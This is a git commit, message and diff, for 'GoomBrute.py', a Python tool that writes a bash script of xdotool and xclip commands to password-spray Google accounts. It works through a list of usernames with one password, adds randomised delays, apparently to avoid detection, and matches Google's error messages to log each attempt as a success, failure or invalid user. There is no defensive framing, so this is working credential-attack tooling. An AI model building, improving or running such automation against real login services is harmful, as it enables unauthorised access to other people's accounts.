5af1e9a1689f16920b4163e4cbe5f5490c45f67a
Gwisin Koht <84480419+gwisinkoht@users.noreply.github.com>
2023-01-23 08:31:50 -0800

    First functioning version of GoomBrute (#2)
    * Test commit
    
    * Make output dir name a variable
    
    * Changed .gitignore to use exclude instead
    
    * Added a success/failure indicator
    
    * Fixed typo
    
    * Fixed more typos.
    
    * Fixed missing quotes on output filename
    
    * Fixed another typo.
    
    * Fixed improper newline handling
    
    * Fixed unclosed for loop
    
    * Broke lines apart
    
    * Added feature to deal with successes breaking the flow
    
    * Changed delay time
    
    * Add comments to functions
    
    * Clean up file clutter
    
    * Add success/failure check after each attempt
    
    Previously page outputs were saved after each login attempt and
    then processed at the end.
    Now after each login attempt, a check is made as to
    whether the login attempt was successful or not and the result is
    written to a results.txt file.
    
    * Add script break after a login success
    
    This is an attempt to fix the issue where the script would continue
    running commands after a successful login attempt, resulting in
    useless clicks. An exit command was added after a successful login
    to quit the window and stop the script from continuing to run.
    
    This may or may not work and requires further testing.
    
    * Fixed syntax errors.
    
    * Fix broken output redirection.
    
    * Remove password display in results due to bugs.
    
    * Remove extraneous code.
    
    * Add results display on console at finish.
    
    * Add changes to per user actions modified during deployment.
    
    * Remove extraneous mouse locations.

--- GoomBrute.py
+++ GoomBrute.py
@@ -10,8 +10,8 @@
 
 _DEV_ = True
 
-from random import randrange
-from pathlib import Path
+from random import randrange # to generate noise
+from pathlib import Path # to handle files
 
 # OPTIONS
 user_list = "users.txt"
@@ -22,6 +22,7 @@ path = Path("password.txt")
 if path.is_file() and _DEV_ == True:
     with open("password.txt",'r') as pass_file:
         password = pass_file.readline()
+        password = "".join(password.split())
         
 
 
@@ -44,18 +45,22 @@ password_field = "820 454"
 # Blank area "x y" coordinates
 blank = "713 182"
 
-source = "922 346"
+output_dir = "GoomBruteOutput"
 
+all_data = "988 191"
 
+# Generates a value for creating noise between request delays.
+# This is a function instead of a variable so that a new random
+# is generated upon each call.
 def add_noise():
     return randrange(0, 15)/10
 
+# Sets the request delay.
 def wait_load():
     return 3
 
 
 # Load the usernames from file into a list.
-
 print(f"Loading username file '{user_list}'...")
 usernames = []
 with open(user_list, "r") as user_file:
@@ -66,12 +71,11 @@ print("Here are the first few usernames: " + str(usernames[0:5]))
 
 print("Creating xdotool sh command list...")
 
-count = 0
 commands = []
 
 for user in usernames:
-    count += 1
-    # Navigate to the desired login portal
+    # Navigate to the desired login portal'
+    user = "".join(user.split())
     commands.append(f"xdotool mousemove {search} click 1 key ctrl+a")
     commands.append("xdotool key 'Delete'")
     commands.append(f"xdotool mousemove {search} click 1 type '{target_url}'")
@@ -99,19 +103,75 @@ for user in usernames:
     
     # Save page results
     commands.append(f"xdotool mousemove {blank} click 1 key ctrl+a")
-    commands.append(f"xclip -o > GoomBruteOutput/raw-output{count}.txt")
+    
+    name = user.split("@")[0]
+    commands.append(f"xclip -o > \"{output_dir}/{name}.txt\"")
 
     # Add a delay
     commands.append(f"sleep {delay}")
+    
+    commands.append(f"sleep {wait_load()}")
+    commands.append(f"xdotool mousemove {all_data} click 1")
+    
+    # Process page result.
+    # Check whether a wrong password was submitted.
+    commands.append(f"result=`cat {output_dir}/{name}.txt | grep -i 'Wrong password. Try again' | wc -c`")
+    commands.append("if [ $result -eq 0 ]")
+    commands.append("then")
+    commands.append("incorrect_pass=false")
+    commands.append("else")
+    commands.append("incorrect_pass=true")
+    commands.append("fi")
+    
+    # Check whether a show password option exists.
+    commands.append(f"result=`cat {output_dir}/{name}.txt | grep -i 'show password' | wc -c`")
+    commands.append("if [ $result -eq 0 ]")
+    commands.append("then")
+    commands.append("show_pass=false")
+    commands.append("else")
+    commands.append("show_pass=true")
+    commands.append("fi")
+ 
+    # Check whether the user does not exist.
+    commands.append(f"result=`cat {output_dir}/{name}.txt | grep -i 'signed in to Google products like YouTube, try again with that email' | wc -c`")
+    commands.append("if [ $result -eq 0 ]")
+    commands.append("then")
+    commands.append("invalid_user=false")
+    commands.append("else")
+    commands.append("invalid_user=true")
+    commands.append("fi")
+    
+    # Determine whether the login was successful.
+    commands.append("if [ $show_pass = true ] || [ $incorrect_pass = true ]")
+    commands.append("then")
+    commands.append("success=false")
+    commands.append("else")
+    commands.append("success=true")
+    commands.append("fi")
+    
+    commands.append("if [ $success = true ]")
+    commands.append("then")
+    commands.append("if [ $invalid_user = false]")
+    commands.append("then")
+    commands.append(f"echo \"{user} Success\" >> {output_dir}/results.txt")
+    commands.append(f"cat {output_dir}/results.txt")
+    commands.append("exit")
+    commands.append("else")
+    commands.append(f"echo \"{user} INVALID_USER\" >> {output_dir}/results.txt")
+    commands.append("fi")    
+    commands.append("else")
+    commands.append(f"echo \"{user} Failure\" >> {output_dir}/results.txt")
+    commands.append("fi")
+        
 
-
+# Write the executable bash script.
 print(f"Writing to '{target_filename}'...\n")
 with open(target_filename, 'w') as output_file:
     print('#!/bin/bash')
     output_file.write("#!/bin/bash\n")
-    output_file.write("mkdir GoomBruteOutput\n")
+    output_file.write(f"mkdir {output_dir}\n")
     for line in commands:
         print(line)
         output_file.write(line)
         output_file.write('\n')
-
+    output_file.write(f"cat {output_dir}/results.txt")
